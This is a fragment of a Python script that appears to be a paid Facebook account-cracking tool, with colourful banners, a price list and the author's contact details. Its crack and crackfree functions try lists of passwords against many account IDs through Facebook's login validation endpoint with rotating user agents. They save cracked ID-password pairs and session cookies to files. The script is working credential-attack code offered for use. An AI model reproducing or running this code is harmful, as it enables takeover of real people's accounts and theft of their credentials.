...
print('\033[38;5;46m[\033[38;5;46m+\033[38;5;46m] \033[38;5;46mChecKING Update...? ')
time.sleep(5)
os.system('clear')
print("\33[1;96m[\33[1;96m+\33[1;96m] \33[1;96mFollow Me On Facebook")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/md.shoron.50115?mibextid=gjUFcU')
#------------------[ SHORON-KING ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
\033[0;95m➣👾 \033[0;94m𝘼𝙐𝙏𝙃𝙊𝙍   : SHORON.            \033[0;94m
\033[0;96m➣👾 \033[0;94m𝑮𝑰𝑻𝑯𝑼𝑩   : XHORON 96              \033[0;94m
\033[0;97m➣👾 \033[0;94m𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 : BD SHORON         \033[0;94m
\033[0;98m➣👾 \033[0;94m𝑾𝑯𝑨𝑻𝑺𝑨𝑷𝑷 : +8801986329144\033[0;94m
\033[0;99m➣👾 \033[0;94m𝑻𝑯𝑰𝑺 𝑻𝑶𝑶𝑳 𝑰𝑺 𝑷𝑨𝑰𝑫         \033[0;94m
\033[0;93m➣👾 \033[0;94m𝑽𝑬𝑹𝑺𝑰𝑶𝑵       •X0.2   ] \033[0;94m
\033[0;97m➣👾 \033[0;94m𝑮𝑰𝑽𝑬 𝑴𝑬 150 𝒕𝒌 𝑭𝑶𝑹 𝑨𝑷𝑹𝑽𝑨𝑳  \033[0;94m
╠══[ 7 𝑫𝑨𝒀𝑺 150 𝑻𝒌➳
╠══[ 15 𝐷𝐴𝑌𝑆 300 𝑇𝑘➳
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
os.system('clear')
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/Hentai.KING.Ok.Bro")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Hentai•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                #print(f'\r\033[0;94m[Hentai-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Hentai-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Hentai,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Hentai-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Hentai-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Hentai-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Hentai,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
